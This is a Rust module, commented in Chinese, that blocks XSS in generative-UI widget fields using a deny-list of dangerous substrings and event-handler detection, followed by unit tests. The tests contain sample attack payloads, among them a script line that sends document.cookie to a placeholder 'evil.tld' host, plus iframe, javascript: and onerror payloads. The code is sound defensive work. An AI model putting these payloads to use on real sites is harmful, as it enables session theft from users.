//! 沙箱校验（Track C2，防 XSS）。
//!
//! 上游 dsh-genui 的硬缺口：**模型手写 HTML/JS = XSS 面**。本模块是进入渲染层
//! 前的 Rust 原生把关，对每个 widget 的每个字符串字段（见
//! [`Widget::text_fields`](crate::genui::Widget::text_fields)）执行拒绝式检查：
//!
//! | 检查项 | 拒绝理由 |
//! |--------|----------|
//! | `<script` / `</script` | 内嵌脚本标签 |
//! | `<iframe` / `<object` / `<embed` | 可加载外部内容的容器标签 |
//! | `javascript:` / `data:text/html` | 伪协议 URI（含 mermaid `click` 回调面） |
//! | `on…=`（事件处理器属性） | 内联事件处理器 |
//! | `version > GENUI_SCHEMA_VERSION` | 新语义不得被旧引擎降级误渲染 |
//!
//! 纪律：本函数是**白名单结构 + 黑名单内容**的第二道闸——第一道是
//! [`Widget`](crate::genui::Widget) 的强类型（模型无法塞进任意 HTML 结构）。
//! 校验失败一律返回带 reason 的 [`GenUiError`]，绝不静默清洗后放行
//! （静默清洗会让调用方误以为内容可信）。

use super::{GenUiDocument, GenUiError, GENUI_SCHEMA_VERSION};

/// 直接出现即拒绝的危险子串（匹配时大小写不敏感）及其人可读原因。
const FORBIDDEN: &[(&str, &str)] = &[
    ("<script", "内嵌 <script> 标签"),
    ("</script", "内嵌 </script> 闭合标签"),
    ("<iframe", "内嵌 <iframe> 框架"),
    ("<object", "内嵌 <object> 标签"),
    ("<embed", "内嵌 <embed> 标签"),
    ("javascript:", "javascript: 伪协议 URI"),
    ("data:text/html", "data:text/html 伪协议 URI"),
];

/// 校验一份生成式 UI 文档是否可安全渲染。
///
/// 先校版本（高于引擎支持即拒），再逐 widget 逐字段扫描注入面。
/// 命中即**立刻返回**首个原因（fail-fast，便于日志定位）。
pub fn validate(doc: &GenUiDocument) -> Result<(), GenUiError> {
    if doc.version > GENUI_SCHEMA_VERSION {
        return Err(GenUiError::UnsupportedVersion {
            found: doc.version,
            supported: GENUI_SCHEMA_VERSION,
        });
    }
    for widget in &doc.widgets {
        for (field, text) in widget.text_fields() {
            if let Some(reason) = scan_text(text) {
                return Err(GenUiError::Unsafe {
                    widget_id: widget.id().to_string(),
                    field: field.to_string(),
                    reason,
                });
            }
        }
    }
    Ok(())
}

/// 扫描单段文本；返回 `Some(reason)` 表示应拒绝。
fn scan_text(text: &str) -> Option<String> {
    let lower = text.to_ascii_lowercase();
    for (needle, reason) in FORBIDDEN {
        if lower.contains(needle) {
            return Some((*reason).to_string());
        }
    }
    if let Some(attr) = find_event_handler_attr(&lower) {
        return Some(format!("内联事件处理器属性 `{attr}=`"));
    }
    None
}

/// 查找 HTML 内联事件处理器属性（`onclick=` / `onload=` / `onerror=` …）。
///
/// 判定规则：`on` + ≥2 个 ASCII 字母 + 可选空白 + `=`，且 `on` 位于串首或
/// 前一字节非「ASCII 字母/数字/下划线」。
///
/// 前置定界是为了在保持拦截力的同时避免误伤正常文本：`monitor_value=`、
/// `comparison_key=` 中的 `on` 前接单词字符，故不误判；而 `<div onclick=`、
/// `" onmouseover =` 等真实注入面前接空白/引号，仍被拦下。非 ASCII 字节
/// （如中文）一律视为定界符，即 `开启onerror=` 也会被拦（偏严，安全方向）。
///
/// 返回命中的属性名（如 `"onclick"`）供报错。
fn find_event_handler_attr(lower: &str) -> Option<&str> {
    let bytes = lower.as_bytes();
    let mut cursor = 0usize;
    while let Some(offset) = lower[cursor..].find("on") {
        let start = cursor + offset;
        let delimited = start == 0 || !is_word_byte(bytes[start - 1]);
        if delimited {
            // 收集 "on" 之后的字母（真实事件处理器名均为纯字母）
            let mut end = start + 2;
            while end < bytes.len() && bytes[end].is_ascii_alphabetic() {
                end += 1;
            }
            if end - (start + 2) >= 2 {
                // 跳过空白后必须紧跟 '='
                let mut probe = end;
                while probe < bytes.len() && bytes[probe].is_ascii_whitespace() {
                    probe += 1;
                }
                if probe < bytes.len() && bytes[probe] == b'=' {
                    return Some(&lower[start..end]);
                }
            }
        }
        // "on" 为 ASCII，start + 2 必落在字符边界上
        cursor = start + 2;
    }
    None
}

/// 是否为「单词字节」（ASCII 字母/数字/下划线）；非 ASCII 视为定界符。
fn is_word_byte(b: u8) -> bool {
    b.is_ascii_alphanumeric() || b == b'_'
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::genui::widget::{
        Block, ChartWidget, FormField, FormWidget, LayoutWidget, MermaidWidget, QuizWidget,
        Scene3DWidget, Series, Widget,
    };

    /// 一份干净的、覆盖全部 6 个变体的文档。
    fn clean_doc() -> GenUiDocument {
        GenUiDocument::new(vec![
            Widget::Layout(LayoutWidget {
                id: "root".into(),
                blocks: vec![
                    Block::Heading {
                        text: "季度经营回顾".into(),
                    },
                    Block::Text {
                        text: "毛利率环比改善 1.2 个百分点。".into(),
                    },
                    Block::Card {
                        title: "风险".into(),
                        body: "原材料价格波动。".into(),
                    },
                ],
            }),
            Widget::Chart(ChartWidget {
                id: "c1".into(),
                chart_type: "line".into(),
                series: vec![Series {
                    name: "营收".into(),
                    points: vec![(0.0, 1.0), (1.0, 1.4)],
                }],
            }),
            Widget::Form(FormWidget {
                id: "f1".into(),
                fields: vec![FormField {
                    label: "联系邮箱".into(),
                    field_type: "text".into(),
                    name: "email".into(),
                }],
            }),
            Widget::Quiz(QuizWidget {
                id: "q1".into(),
                question: "毛利率改善的主因是？".into(),
                options: vec!["降本".into(), "涨价".into()],
            }),
            Widget::Mermaid(MermaidWidget {
                id: "m1".into(),
                source: "graph TD; 采购-->生产; 生产-->交付;".into(),
            }),
            Widget::Scene3D(Scene3DWidget {
                id: "s1".into(),
                scene: "{\"objects\":[\"warehouse\"],\"camera\":\"iso\"}".into(),
            }),
        ])
    }

    #[test]
    fn accepts_clean_document() {
        let doc = clean_doc();
        assert!(
            validate(&doc).is_ok(),
            "无注入且版本匹配的文档应放行：{:?}",
            validate(&doc).err()
        );
    }

    #[test]
    fn rejects_script_tag_injection() {
        let mut doc = clean_doc();
        doc.widgets[0] = Widget::Layout(LayoutWidget {
            id: "root".into(),
            blocks: vec![Block::Text {
                text: "正常开头 <script>fetch('//evil.tld?c='+document.cookie)</script>".into(),
            }],
        });
        let err = validate(&doc).expect_err("含 <script> 应被拒绝");
        match err {
            GenUiError::Unsafe {
                widget_id,
                field,
                reason,
            } => {
                assert_eq!(widget_id, "root");
                assert_eq!(field, "block.text.text");
                assert!(reason.contains("<script>"), "原因应指明脚本标签：{reason}");
            }
            other => panic!("应为 Unsafe 变体，实为 {other:?}"),
        }
    }

    #[test]
    fn rejects_onclick_event_handler_attr() {
        let mut doc = clean_doc();
        doc.widgets[2] = Widget::Form(FormWidget {
            id: "f1".into(),
            fields: vec![FormField {
                label: "<div onclick=\"steal()\">点我</div>".into(),
                field_type: "text".into(),
                name: "email".into(),
            }],
        });
        let err = validate(&doc).expect_err("含 onclick= 应被拒绝");
        match err {
            GenUiError::Unsafe {
                widget_id,
                field,
                reason,
            } => {
                assert_eq!(widget_id, "f1");
                assert_eq!(field, "field.label");
                assert!(reason.contains("onclick"), "原因应指明处理器名：{reason}");
            }
            other => panic!("应为 Unsafe 变体，实为 {other:?}"),
        }
    }

    #[test]
    fn rejects_version_above_engine_support() {
        let mut doc = clean_doc();
        doc.version = GENUI_SCHEMA_VERSION + 1;
        let err = validate(&doc).expect_err("超出支持版本应被拒绝");
        match err {
            GenUiError::UnsupportedVersion { found, supported } => {
                assert_eq!(found, GENUI_SCHEMA_VERSION + 1);
                assert_eq!(supported, GENUI_SCHEMA_VERSION);
            }
            other => panic!("应为 UnsupportedVersion 变体，实为 {other:?}"),
        }
    }

    #[test]
    fn rejects_injection_in_every_widget_field() {
        // 逐变体确认校验面无死角（含 mermaid source / scene3d scene / quiz option）
        let cases: Vec<(Widget, &str)> = vec![
            (
                Widget::Mermaid(MermaidWidget {
                    id: "m1".into(),
                    source: "graph TD; A-->B; click A \"javascript:alert(1)\"".into(),
                }),
                "source",
            ),
            (
                Widget::Scene3D(Scene3DWidget {
                    id: "s1".into(),
                    scene: "<iframe src=//evil.tld>".into(),
                }),
                "scene",
            ),
            (
                Widget::Quiz(QuizWidget {
                    id: "q1".into(),
                    question: "选一个".into(),
                    options: vec!["正常".into(), "<script>x()</script>".into()],
                }),
                "option",
            ),
            (
                Widget::Chart(ChartWidget {
                    id: "c1".into(),
                    chart_type: "line".into(),
                    series: vec![Series {
                        name: "<img src=x onerror=alert(1)>".into(),
                        points: vec![],
                    }],
                }),
                "series.name",
            ),
        ];
        for (widget, expect_field) in cases {
            let kind = widget.kind();
            let doc = GenUiDocument::new(vec![widget]);
            match validate(&doc) {
                Err(GenUiError::Unsafe { field, .. }) => {
                    assert_eq!(field, expect_field, "{kind} 命中字段应为 {expect_field}")
                }
                other => panic!("{kind} 的注入应被拒绝，实得 {other:?}"),
            }
        }
    }

    #[test]
    fn rejects_uppercase_and_spaced_variants() {
        // 大小写混写 + 属性名与 '=' 间留空白，均不得绕过
        assert!(
            scan_text("<ScRiPt>x</ScRiPt>").is_some(),
            "大小写混写不得绕过"
        );
        assert!(
            scan_text("<div onmouseover = \"x()\">").is_some(),
            "= 前留空白不得绕过"
        );
        assert!(
            scan_text("<a href=\"JavaScript:alert(1)\">").is_some(),
            "伪协议大小写混写不得绕过"
        );
    }

    #[test]
    fn does_not_false_positive_on_ordinary_text() {
        // 正常业务文本中含 "on" 的词不得被误判
        for s in [
            "monitor_value=42 已上报",
            "comparison_key=abc",
            "electron_build=stable",
            "部署 on Windows = 已完成",
            "配置项 on_change=true 生效",
            "Season 2 = 上线",
        ] {
            assert!(
                scan_text(s).is_none(),
                "正常文本不应被误判为注入：{s} → {:?}",
                scan_text(s)
            );
        }
    }

    #[test]
    fn detects_handler_at_string_start() {
        // 串首即处理器（无前置定界符）也须拦下
        assert_eq!(find_event_handler_attr("onerror=alert(1)"), Some("onerror"));
        // "on" 后仅 1 个字母不构成真实处理器名
        assert_eq!(find_event_handler_attr("onx=1"), None);
    }
}
